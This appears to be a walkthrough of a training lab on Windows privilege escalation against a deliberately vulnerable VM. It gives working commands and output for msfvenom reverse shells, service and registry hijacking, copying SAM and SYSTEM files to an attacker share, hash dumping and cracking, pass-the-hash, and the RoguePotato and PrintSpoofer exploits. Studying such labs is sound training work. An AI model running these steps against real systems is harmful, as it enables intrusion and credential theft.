# Windows PrivEsc room by Tib3rius

## Task 1 Deploy the Vulnerable Windows VM 

```bash
$ xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.60.154
```

## Task 2 Generate a Reverse Shell Executable

#### Generate a reverse shell executable (reverse.exe) using msfvenom

```bash
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=53 -f exe -o reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: reverse.exe
```

#### Start an SMB server on Kali in the same directory as the file

```bash
$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

#### Use the standard Windows copy command to transfer the file

```windows
copy \\10.X.X.X\kali\reverse.exe C:\PrivEsc\reverse.exe
```

## Task 3 Service Exploits - Insecure Service Permissions 

#### Use accesschk.exe to check the "user" account's permissions on the "daclsvc" service:

```
C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
RW daclsvc
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL
```

#### Query the service and note that it runs with SYSTEM privileges

```
C:\PrivEsc>sc qc daclsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

#### Modify the service config and set the BINARY_PATH_NAME (binpath) to the reverse.exe executable you created:

```
C:\PrivEsc>sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
[SC] ChangeServiceConfig SUCCESS
```

#### Start the service to spawn a reverse shell running with SYSTEM privileges

```
C:\PrivEsc>net start daclsvc
The service is not responding to the control function.
```

```
C:\Windows\system32>whoami
nt authority\system
```

## Task 4 Service Exploits - Unquoted Service Path

#### Query the "unquotedsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME) and that the BINARY_PATH_NAME is unquoted and contains spaces.

```
C:\PrivEsc>sc qc unquotedsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: unquotedsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Unquoted Path Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

#### Note that the BUILTIN\Users group is allowed to write to the C:\Program Files\Unquoted Path Service\ directory

```
C:\PrivEsc>C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\" 
C:\Program Files\Unquoted Path Service
  Medium Mandatory Level (Default) [No-Write-Up]
  RW BUILTIN\Users
  RW NT SERVICE\TrustedInstaller
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
```

#### Copy the reverse.exe executable you created to this directory and rename it Common.exe

```
C:\PrivEsc>copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
        1 file(s) copied.
```

#### Start the service to spawn a reverse shell running with SYSTEM privileges

```
C:\PrivEsc>net start unquotedsvc
The service is not responding to the control function.
```

```
C:\Windows\system32>whoami
nt authority\system
```

## Task 5 Service Exploits - Weak Registry Permissions 

#### Query the "regsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME).

```
C:\PrivEsc>sc qc regsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: regsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Insecure Registry Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

#### Using accesschk.exe, note that the registry entry for the regsvc service is writable by the "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users):

```
C:\PrivEsc>C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        KEY_ALL_ACCESS
  RW BUILTIN\Administrators
        KEY_ALL_ACCESS
  RW NT AUTHORITY\INTERACTIVE
        KEY_ALL_ACCESS
```

#### Overwrite the ImagePath registry key to point to the reverse.exe executable you created:

```
C:\PrivEsc>reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
The operation completed successfully.
```

#### Start the service to spawn a reverse shell running with SYSTEM privileges:

```
C:\PrivEsc>net start regsvc
The service is not responding to the control function.
```

```
C:\Windows\system32>whoami
nt authority\system
```

## Task 6 Service Exploits - Insecure Service Executables 

#### Query the "filepermsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME).

```
C:\PrivEsc>sc qc filepermsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: filepermsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\File Permissions Service\filepermservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : File Permissions Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

#### Using accesschk.exe, note that the service binary (BINARY_PATH_NAME) file is writable by everyone:

```
C:\PrivEsc>C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
C:\Program Files\File Permissions Service\filepermservice.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
  RW WIN-QBA94KB3IOF\Administrator
        FILE_ALL_ACCESS
  RW BUILTIN\Users
        FILE_ALL_ACCESS
```

#### Copy the reverse.exe executable you created and replace the filepermservice.exe with it:

```
C:\PrivEsc>copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
        1 file(s) copied.
```

#### Start the service to spawn a reverse shell running with SYSTEM privileges:

```
C:\PrivEsc>net start filepermsvc
The service is not responding to the control function.
```

```
C:\Windows\system32>whoami
nt authority\system
```

## Task 7 Registry - AutoRuns 

#### Query the registry for AutoRun executables:

```
C:\PrivEsc>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
    My Program    REG_SZ    "C:\Program Files\Autorun Program\program.exe"
```

#### Using accesschk.exe, note that one of the AutoRun executables is writable by everyone:

```
C:\PrivEsc>C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"

AccessChk v4.02 - Check access of files, keys, objects, processes or services
Copyright (C) 2006-2007 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Program Files\Autorun Program\program.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
  RW WIN-QBA94KB3IOF\Administrator
        FILE_ALL_ACCESS
  RW BUILTIN\Users
        FILE_ALL_ACCESS
```

#### Copy the reverse.exe executable you created and overwrite the AutoRun executable with it:

```
C:\PrivEsc>copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
        1 file(s) copied.
```

#### Restart the Windows VM

```
C:\PrivEsc>shutdown /r /t 0
```

## Task 8 Registry - AlwaysInstallElevated

#### Query the registry for AlwaysInstallElevated keys. Note that both keys are set to 1 (0x1).

```
C:\PrivEsc>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1

C:\PrivEsc>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

#### Generate a reverse shell Windows Installer (reverse.msi) using msfvenom

```
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=53 -f msi -o reverse.msi    1 ⨯
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: reverse.msi
```

#### Run the installer to trigger a reverse shell running with SYSTEM privileges

```
C:\PrivEsc>msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```

```
C:\Windows\system32>whoami
nt authority\system
```

## Task 9 Passwords - Registry

#### The registry can be searched for keys and values that contain the word "password". Query this specific key to find admin AutoLogon credentials:

```
C:\PrivEsc>reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DefaultDomainName    REG_SZ    
    DefaultUserName    REG_SZ    admin
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ    
    LegalNoticeText    REG_SZ    
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x2565dea06
    ShutdownFlags    REG_DWORD    0x80000027
    AutoAdminLogon    REG_SZ    0
    AutoLogonSID    REG_SZ    S-1-5-21-3025105784-3259396213-1915610826-1001
    LastUsedUsername    REG_SZ    admin
    DefaultPassword    REG_SZ    password123

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon\AlternateShells
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon\GPExtensions
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon\UserDefaults
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon\AutoLogonChecked
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon\VolatileUserMgrKey
```

#### Use the winexe command to spawn a command prompt running with the admin privileges

```
$ winexe -U 'admin%password123' //10.10.195.194 cmd.exe
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
win-qba94kb3iof\admin
```

## Task 10 Passwords - Saved Creds 

#### List any saved credentials:

```
C:\PrivEsc>cmdkey /list

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic 
    User: 02nfpgrklkitqatu
    Local machine persistence
    
    Target: Domain:interactive=WIN-QBA94KB3IOF\admin
    Type: Domain Password
    User: WIN-QBA94KB3IOF\admin
```

#### Run the reverse.exe executable using runas with the admin user's saved credentials:

```
C:\PrivEsc>runas /savecred /user:admin C:\PrivEsc\reverse.exe
```

```
C:\Windows\system32>whoami
win-qba94kb3iof\admin
```

## Task 11 Passwords - Security Account Manager (SAM)

#### Transfer the SAM and SYSTEM files to your Kali VM

```
C:\PrivEsc>copy C:\Windows\Repair\SAM \\10.8.87.140\kali\                            
        1 file(s) copied.

C:\PrivEsc>copy C:\Windows\Repair\SYSTEM \\10.8.87.140\kali\
        1 file(s) copied.
```

#### Clone the creddump7 repository (the one on Kali is outdated and will not dump hashes correctly for Windows 10!) and use it to dump out the hashes from the SAM and SYSTEM files:

```bash
$ sudo apt-get install python-dev
$ sudo pip2 install pycrypto 
$ python2 creddump7/pwdump.py SYSTEM SAM
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6ebaa6d5e6e601996eefe4b6048834c2:::
user:1000:aad3b435b51404eeaad3b435b51404ee:91ef1073f6ae95f5ea6ace91c09a963a:::
admin:1001:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
```

#### Crack the admin NTLM hash using hashcat:

```bash
$ hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlists/rockyou.txt
a9fdfa038c4b75ebc76dc855dd74f0da:password123 
```

## Task 12 Passwords - Passing the Hash

#### Use the full admin hash with pth-winexe to spawn a shell running as admin without needing to crack their password. 

```bash
$ pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.56.93 cmd.exe
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
win-qba94kb3iof\admin
```

## Task 13 Scheduled Tasks

#### View the contents of the C:\DevTools\CleanUp.ps1 script:

```
C:\Windows\system32>type C:\DevTools\CleanUp.ps1
type C:\DevTools\CleanUp.ps1
# This script will clean up all your old dev logs every minute.
# To avoid permissions issues, run as SYSTEM (should probably fix this later)

Remove-Item C:\DevTools\*.log
```

#### Note that you have the ability to write to this file:

```
C:\Windows\system32>C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
RW C:\DevTools\CleanUp.ps1
        FILE_ADD_FILE
        FILE_ADD_SUBDIRECTORY
        FILE_APPEND_DATA
        FILE_EXECUTE
        FILE_LIST_DIRECTORY
        FILE_READ_ATTRIBUTES
        FILE_READ_DATA
        FILE_READ_EA
        FILE_TRAVERSE
        FILE_WRITE_ATTRIBUTES
        FILE_WRITE_DATA
        FILE_WRITE_EA
        DELETE
        SYNCHRONIZE
        READ_CONTROL
```

#### Append a line to the C:\DevTools\CleanUp.ps1 which runs the reverse.exe executable you created:

```
C:\Users\user\Desktop>echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
```

```
C:\Windows\system32>whoami
nt authority\system
```

## Task 14 Insecure GUI Apps

#### Note that Paint is running with admin privileges:

```
C:\Users\user\Desktop>tasklist /V | findstr mspaint.exe
mspaint.exe                   4176 RDP-Tcp#0                  2     29,108 K Unknown         WIN-QBA94KB3IOF\admin                                   0:00:00 N/A 
```

#### In the open file dialog box, click in the navigation input and paste: file://c:/windows/system32/cmd.exe

# DOES NOT WORK

## Task 15 Startup Apps 

#### Note that the BUILTIN\Users group can write files to the StartUp directory:

```
C:\Users\user\Desktop>C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

AccessChk v4.02 - Check access of files, keys, objects, processes or services
Copyright (C) 2006-2007 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
  Medium Mandatory Level (Default) [No-Write-Up]
  RW BUILTIN\Users
  RW WIN-QBA94KB3IOF\Administrator
  RW WIN-QBA94KB3IOF\admin
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
  R  Everyone
```

#### Run the C:\PrivEsc\CreateShortcut.vbs script which should create a new shortcut to your reverse.exe executable in the StartUp directory:

```
C:\Users\user\Desktop>type C:\PrivEsc\CreateShortcut.vbs
type C:\PrivEsc\CreateShortcut.vbs
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\reverse.exe"
oLink.Save

C:\Users\user\Desktop>cscript C:\PrivEsc\CreateShortcut.vbs
```

#### Simulate an admin logon using RDP and the credentials you previously extracted

## Task 16 Token Impersonation - Rogue Potato 

#### Name the user privileges that allows this exploit to work

```
SeImpersonatePrivilege
SeAssignPrimaryTokenPrivilege
```

#### Set up a socat redirector on Kali, forwarding Kali port 135 to port 9999 on Windows:

```bash
$ sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.228.177:9999
```

#### Run the RoguePotato exploit to trigger a reverse shell running with SYSTEM privileges

```
C:\PrivEsc\RoguePotato.exe -r 10.8.87.140 -e "C:\PrivEsc\reverse.exe" -l 9999
[+] Starting RoguePotato...
[*] Creating Rogue OXID resolver thread
[*] Creating Pipe Server thread..
[*] Creating TriggerDCOM thread...
[*] Listening on pipe \\.\pipe\RoguePotato\pipe\epmapper, waiting for client to connect
[*] Calling CoGetInstanceFromIStorage with CLSID:{4991d34b-80a1-4291-83b6-3328366b9097}
[*] Starting RogueOxidResolver RPC Server listening on port 9999 ... 
[*] IStoragetrigger written:104 bytes
[*] SecurityCallback RPC call
[*] ServerAlive2 RPC Call
[*] SecurityCallback RPC call
[*] ResolveOxid2 RPC call, this is for us!
[*] ResolveOxid2: returned endpoint binding information = ncacn_np:localhost/pipe/RoguePotato[\pipe\epmapper]
[*] Client connected!
[+] Got SYSTEM Token!!!
[*] Token has SE_ASSIGN_PRIMARY_NAME, using CreateProcessAsUser() for launching: C:\PrivEsc\reverse.exe
[+] RoguePotato gave you the SYSTEM powerz :D
```

```
C:\Windows\system32>whoami
nt authority\system
```

## Task 17 Token Impersonation - PrintSpoofer 

#### Run the PrintSpoofer exploit to trigger a reverse shell running with SYSTEM privileges

```
C:\Windows\system32>C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```

```
C:\Windows\system32>whoami
nt authority\system
```

## Task 18 Privilege Escalation Scripts

#### winPEASany.exe

```
C:\PrivEsc>winPEASany.exe -h 
  [*] WinPEAS is a binary to enumerate possible paths to escalate privileges locally
        quiet             Do not print banner
        searchfast        Avoid sleeping while searching files (notable amount of resources)
        searchall         Search all known filenames whith possible credentials (coul take some mins)                                                                                         
        cmd               Obtain wifi, cred manager and clipboard information executing CMD commands                                                                                          
        notansi           Don't use ansi colors (all white)
        systeminfo        Search system information
        userinfo          Search user information
        procesinfo        Search processes information
        servicesinfo      Search services information
        applicationsinfo  Search installed applications information
        networkinfo       Search network information
        windowscreds      Search windows credentials
        browserinfo       Search browser information
        filesinfo         Search files that can contains credentials
        [+] By default all checks (except CMD checks) are executed

C:\PrivEsc>winPEASany.exe
ANSI color bit for Windows is not set. If you are execcuting this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
   Creating Dynamic lists, this could take a while, please wait...
   - Checking if domain...
   - Getting Win32_UserAccount info...
   - Creating current user groups list...
  [X] Exception: Object reference not set to an instance of an object.
  [X] Exception: The server could not be contacted.
  [X] Exception: Object reference not set to an instance of an object.
  [X] Exception: The server could not be contacted.
  [X] Exception: Object reference not set to an instance of an object.
  [X] Exception: The server could not be contacted.
   - Creating active users list...
   - Creating disabled users list...
   - Admin users list...
     
             *((,.,/((((((((((((((((((((/,  */                                                 
      ,/*,..*((((((((((((((((((((((((((((((((((,                                               
    ,*/((((((((((((((((((/,  .*//((//**, .*(((((((*                                            
    ((((((((((((((((**********/########## .(* ,(((((((                                         
    (((((((((((/********************/####### .(. (((((((                                       
    ((((((..******************/@@@@@/***/###### ./(((((((                                      
    ,,....********************@@@@@@@@@@(***,#### .//((((((                                    
    , ,..********************/@@@@@%@@@@/********##((/ /((((                                   
    ..((###########*********/%@@@@@@@@@/************,,..((((                                   
    .(##################(/******/@@@@@/***************.. /((                                   
    .(#########################(/**********************..*((                                   
    .(##############################(/*****************.,(((                                   
    .(###################################(/************..(((                                   
    .(#######################################(*********..(((                                   
    .(#######(,.***.,(###################(..***.*******..(((                                   
    .(#######*(#####((##################((######/(*****..(((                                   
    .(###################(/***********(##############(...(((                                   
    .((#####################/*******(################.((((((                                   
    .(((############################################(..((((                                    
    ..(((##########################################(..(((((                                    
    ....((########################################( .(((((                                     
    ......((####################################( .((((((                                      
    (((((((((#################################(../((((((                                       
        (((((((((/##########################(/..((((((                                         
              (((((((((/,.  ,*//////*,. ./(((((((((((((((.                                     
                 (((((((((((((((((((((((((((((/                                                

ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.          
                                                                                               
  WinPEAS vBETA VERSION, Please if you find any issue let me know in https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/issues by carlospolop                          

  [+] Leyend:
         Red                Indicates a special privilege over an object or something is misconfigured                                                                                        
         Green              Indicates that some protection is enabled or something is well configured                                                                                         
         Cyan               Indicates active users
         Blue               Indicates disabled users
         LightYellow        Indicates links

   [?] You can find a Windows local PE Checklist here: https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation                                                             


  ==========================================(System Information)==========================================                                                                                    

  [+] Basic System Information(T1082&T1124&T1012&T1497&T1212)
   [?] Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#kernel-exploits                               
    Hostname: WIN-QBA94KB3IOF
    ProductName: Windows Server 2019 Standard Evaluation
    EditionID: ServerStandardEval
    ReleaseId: 1809
    BuildBranch: rs5_release
    CurrentMajorVersionNumber: 10
    CurrentVersion: 6.3
    Architecture: AMD64
    ProcessorCount: 1
    SystemLang: en-US
    KeyboardLang: English (United States)
    TimeZone: (UTC-08:00) Pacific Time (US & Canada)
    IsVirtualMachine: False
    Current Time: 1/7/2021 6:59:42 AM
    HighIntegrity: False
    PartOfDomain: False
    Hotfixes: KB4514366, KB4512577, KB4512578, 

  [?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)
    OS Build Number: 17763
       [!] CVE-2019-1315 : VULNERABLE
        [>] https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html                                                                                             

       [!] CVE-2019-1385 : VULNERABLE
        [>] https://www.youtube.com/watch?v=K6gHnr-VkAg

       [!] CVE-2019-1388 : VULNERABLE
        [>] https://github.com/jas502n/CVE-2019-1388

       [!] CVE-2019-1405 : VULNERABLE
        [>] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/                                                                         

    Finished. Found 4 potential vulnerabilities.

  [+] PowerShell Settings()
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.17763.1
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 

  [+] Audit Settings(T1012)
   [?] Check what is being logged 
    Not Found

  [+] WEF Settings(T1012)
   [?] Windows Event Forwarding, is interesting to know were are sent the logs 
    Not Found

  [+] LAPS Settings(T1012)
   [?] If installed, local administrator password is changed frequently and is restricted by ACL                                                                                              
    LAPS Enabled: LAPS not installed

  [+] Wdigest()
   [?] If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#wdigest                                          
    Wdigest is not enabled

  [+] LSA Protection()
   [?] If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#lsa-protection                                                
    LSA Protection is not enabled

  [+] Credentials Guard()
   [?] If enabled, a driver is needed to read LSASS memory https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#credential-guard                                  
    CredentialGuard is not enabled

  [+] Cached Creds()
   [?] If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#cached-credentials   
    cachedlogonscount is 10

  [+] User Environment Variables()
   [?] Check for some passwords or keys in the env variables 
    COMPUTERNAME: WIN-QBA94KB3IOF
    PUBLIC: C:\Users\Public
    LOCALAPPDATA: C:\Windows\ServiceProfiles\LocalService\AppData\Local
    PSModulePath: %ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
    PROCESSOR_ARCHITECTURE: AMD64
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps;;C:\Temp;C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\WindowsApps
    CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
    ProgramFiles(x86): C:\Program Files (x86)
    PROCESSOR_LEVEL: 6
    ProgramFiles: C:\Program Files
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
    USERPROFILE: C:\Windows\ServiceProfiles\LocalService
    SystemRoot: C:\Windows
    ALLUSERSPROFILE: C:\ProgramData
    DriverData: C:\Windows\System32\Drivers\DriverData
    ProgramData: C:\ProgramData
    PROCESSOR_REVISION: 4f01
    USERNAME: LOCAL SERVICE
    CommonProgramW6432: C:\Program Files\Common Files
    CommonProgramFiles: C:\Program Files\Common Files
    OS: Windows_NT
    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
    ComSpec: C:\Windows\system32\cmd.exe
    PROMPT: $P$G
    SystemDrive: C:
    TEMP: C:\Windows\SERVIC~1\LOCALS~1\AppData\Local\Temp
    NUMBER_OF_PROCESSORS: 1
    APPDATA: C:\Windows\ServiceProfiles\LocalService\AppData\Roaming
    TMP: C:\Windows\SERVIC~1\LOCALS~1\AppData\Local\Temp
    ProgramW6432: C:\Program Files
    windir: C:\Windows
    USERDOMAIN: NT AUTHORITY

  [+] System Environment Variables()
   [?] Check for some passwords or keys in the env variables 
    ComSpec: C:\Windows\system32\cmd.exe
    DriverData: C:\Windows\System32\Drivers\DriverData
    OS: Windows_NT
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps;;C:\Temp
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
    PROCESSOR_ARCHITECTURE: AMD64
    PSModulePath: C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
    TEMP: C:\Windows\TEMP
    TMP: C:\Windows\TEMP
    USERNAME: SYSTEM
    windir: C:\Windows
    NUMBER_OF_PROCESSORS: 1
    PROCESSOR_LEVEL: 6
    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
    PROCESSOR_REVISION: 4f01

  [+] HKCU Internet Settings(T1012)
    DisableCachingOfSSLPages: 0
    IE5_UA_Backup_Flag: 5.0
    PrivacyAdvanced: 1
    SecureProtocols: 2688
    User Agent: Mozilla/5.0 (compatible; MSIE 9.0; Win32)
    CertificateRevocation: 1

  [+] HKLM Internet Settings(T1012)
    ActiveXCache: C:\Windows\Downloaded Program Files
    CodeBaseSearchPath: CODEBASE
    EnablePunycode: 1
    MinorVersion: 0
    WarnOnIntranet: 1

  [+] Drives Information(T1120)
   [?] Remember that you should search more info inside the other drives 
    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 29 GB)(Permissions: Users [AppendData/CreateDirectories])                                                                            

  [+] AV Information(T1063)
  [X] Exception: Invalid namespace 
